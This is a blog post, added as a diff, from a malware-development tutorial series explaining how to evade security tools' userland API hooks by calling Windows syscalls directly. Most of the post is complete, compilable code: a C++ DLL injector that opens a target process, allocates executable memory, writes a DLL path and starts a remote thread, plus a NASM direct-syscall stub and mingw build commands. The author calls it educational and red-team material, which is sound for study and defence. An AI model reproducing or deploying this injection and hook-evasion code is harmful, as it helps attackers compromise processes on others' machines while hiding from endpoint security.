@@ -1,0 +1,231 @@
+---
+title:  "Malware development trick - part 33. Syscalls - part 2. Simple C++ example."
+date:   2023-06-09 03:00:00 +0300
+header:
+  teaser: "/assets/images/100/2023-06-09_23-58.png"
+categories:
+  - malware
+tags:
+  - windows
+  - malware
+  - red team
+  - win32api
+---
+
+﷽
+
+Hello, cybersecurity enthusiasts and white hackers!        
+
+![trick](/assets/images/100/2023-06-09_23-58.png){:class="img-responsive"}      
+
+This post is the result of my own research and the second post in a series of articles about windows system calls.    
+
+### userland hooking
+
+Security software often implements a technique known as API hooking on system calls, which allows these tools to inspect and monitor the behavior of applications while they are running. This capability can provide vital insights into program execution and possible security threats.      
+
+Moreover, these security solutions have the authority to examine any memory area designated as executable, scanning for specific patterns or signatures. These hooks, installed in user mode, are typically set up prior to the execution of the system call instruction, which signifies the final stage of a user mode system call function.      
+
+For example, `NtAllocateVirtualMemory` is a system call used to allocate virtual memory. When an application calls `NtAllocateVirtualMemory`, it is asking the operating system to reserve a block of virtual memory for its use.     
+
+Security solutions can place a hook on `NtAllocateVirtualMemory` to monitor how applications are using memory. This can help the security solution detect malicious activities. For example, if an application is allocating a very large amount of memory or if it's allocating memory in a suspicious manner, that could be a sign of a memory-based attack or a memory leak.       
+
+By hooking into `NtAllocateVirtualMemory`, the security solution can inspect these activities in real-time and potentially stop malicious activities before they cause damage. The ability to analyze and interpret the behavior of such function calls is an essential aspect of many host-based security solutions.      
+
+### direct syscalls
+
+Using syscalls directly is one method of bypassing userland hooks. A way to avoid detection by security tools that hook into system calls in user space could be accomplished by creating a customized version of the system call function using assembly language, and then executing this customized function directly from the assembly file.        
+
+### practical example
+
+Let's look at the example from the first part:      
+
+```cpp
+/*
+hack.c
+classic DLL injection example
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+
+#pragma comment(lib, "ntdll")
+
+typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
+  HANDLE             ProcessHandle,
+  PVOID              *BaseAddress,
+  ULONG              ZeroBits,
+  PULONG             RegionSize,
+  ULONG              AllocationType,
+  ULONG              Protect
+);
+
+char evilDLL[] = "C:\\temp\\evil.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+
+int main(int argc, char* argv[]) {
+  HANDLE ph; // process handle
+  HANDLE rt; // remote thread
+  LPVOID rb; // remote buffer
+
+  // handle to kernel32 and pass it to GetProcAddress
+  HMODULE hKernel32 = GetModuleHandle("Kernel32");
+  HMODULE ntdll = GetModuleHandle("ntdll");
+  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+
+  // parse process ID
+  if ( atoi(argv[1]) == 0) {
+    printf("PID not found :( exiting...\n");
+    return -1;
+  }
+  printf("PID: %i", atoi(argv[1]));
+  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+
+  pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");  
+
+  // allocate memory buffer for remote process
+  myNtAllocateVirtualMemory(ph, &rb, 0, (PULONG)&evilLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+  // "copy" evil DLL between processes
+  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+
+  // our process start new thread
+  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+  CloseHandle(ph);
+  return 0;
+}
+```
+
+Below is an example of a created syscall in an assembly file (`syscall.asm`):    
+
+```nasm
+section .text
+global myNtAllocateVirtualMemory
+myNtAllocateVirtualMemory:
+  mov r10, rcx
+  mov eax, 18h ; syscall number for NtAllocateVirtualMemory
+  syscall
+  ret
+```
+
+For the same result as invoking `NtAllocateVirtualMemory` with `GetProcAddress` and `GetModuleHandle`, the following assembly function may be used instead. This eliminates the requirement to invoke `NtAllocateVirtualMemory` from within the `ntdll` address space, where hooks are installed, thus avoiding the hooks.       
+
+In our `C` code, we can define and use the `myNtAllocateVirtualMemory` function like this:     
+
+```cpp
+/*
+hack.c
+syscall via assembly
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2023/06/09/syscalls-2.html
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+
+char evilDLL[] = "C:\\temp\\evil.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+
+extern "C" NTSTATUS myNtAllocateVirtualMemory(
+    HANDLE             ProcessHandle,
+    PVOID              *BaseAddress,
+    ULONG              ZeroBits,
+    PULONG             RegionSize,
+    ULONG              AllocationType,
+    ULONG              Protect
+  );
+
+int main(int argc, char* argv[]) {
+  HANDLE ph; // process handle
+  HANDLE rt; // remote thread
+  LPVOID rb; // remote buffer
+
+  // handle to kernel32 and pass it to GetProcAddress
+  HMODULE hKernel32 = GetModuleHandle("Kernel32");
+  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+
+  // parse process ID
+  if ( atoi(argv[1]) == 0) {
+    printf("PID not found :( exiting...\n");
+    return -1;
+  }
+  printf("PID: %i", atoi(argv[1]));
+  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+
+  myNtAllocateVirtualMemory(ph, &rb, 0, (PULONG)&evilLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+  // "copy" evil DLL between processes
+  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+
+  // our process start new thread
+  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+  CloseHandle(ph);
+  return 0;
+}
+```
+
+In order to add an assembly function into our `C` program and to establish its name, return type, and parameters, we utilize the `extern "C"` (`EXTERN_C`) directive. This preprocessor directive indicates that the function is defined elsewhere, and it is linked and invoked according to the `C`-language conventions. This approach is also applicable when we want to include assembly language written system call functions in our code. Simply convert the system call invocations written in assembly to the appropriate assembler template syntax, define the function using the `EXTERN_C` directive, and add to our code (or store this in a header file, this header file can then be included in our project.).      
+
+That's all.    
+
+### demo
+
+Let's go to see everything in action.       
+
+First of all compile our `.asm` file:     
+
+```bash
+nasm -f win64 -o syscall.o syscall.asm
+```
+
+![trick](/assets/images/100/2023-06-09_23-52.png){:class="img-responsive"}      
+
+We would then compile:     
+
+```bash
+x86_64-w64-mingw32-g++ -m64 -c hack.c -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -Wall -shared -fpermissive
+```
+
+![trick](/assets/images/100/2023-06-09_23-54.png){:class="img-responsive"}      
+
+and link these together like so:    
+
+```bash
+x86_64-w64-mingw32-gcc *.o -o hack.exe
+```
+
+![trick](/assets/images/100/2023-06-09_23-55.png){:class="img-responsive"}      
+
+And run our "malware" in the victim's machine (`Windows 10 x64 1903`):     
+
+```powershell
+.\hack.exe <PID>
+```
+
+![trick](/assets/images/100/2023-06-10_00-00.png){:class="img-responsive"}      
+
+![trick](/assets/images/100/2023-06-09_23-59.png){:class="img-responsive"}      
+
+As you can see everything is worked perfectly! =^..^=
+
+Because I am compiling it with `mingw`, I am utilizing `NASM` assembler. If you want `MASM`, you need to copy the `syscall.asm` file and modify the customized project settings in Visual Studio.     
+
+As I wrote earlier, please be aware that the system call number (`0x18` for `NtAllocateVirtualMemory` in this case) can change between different versions of Windows. Another solution is the use of [Syswhispers](https://github.com/klezVirus/SysWhispers3). SysWhispers helps with evasion by generating header/ASM files implants can use to make direct system calls.     
+
+As a proof of concept, we created a real-life example, but what about `AV/EDR` evasion? Some readers have asked me to write an example that returns `0` detections in VirusTotal. For reasons of safety and conscience, I can not show a full-fledged PoC example for this, but I think I can give hints. I hope this post spreads awareness to the blue teamers of this interesting malware dev technique, and adds a weapon to the red teamers arsenal.             
+
+[Syscalls x64](https://j00ru.vexillium.org/syscalls/nt/64/)      
+[Windows System Calls Table](https://github.com/j00ru/windows-syscalls/)        
+[SysWhispers3](https://github.com/klezVirus/SysWhispers3)      
+[Code injection via NtAllocateVirtualMemory](/tutorial/2021/12/07/malware-injection-10.html)       
+[Classic DLL injection into the process. Simple C++ malware](/tutorial/2021/09/20/malware-injection-2.html)        
+[source code in github](https://github.com/cocomelonc/2023-06-09-syscalls-2)           
+
+> This is a practical case for educational purposes only.
+
+Thanks for your time happy hacking and good bye!         
+*PS. All drawings and screenshots are mine*       
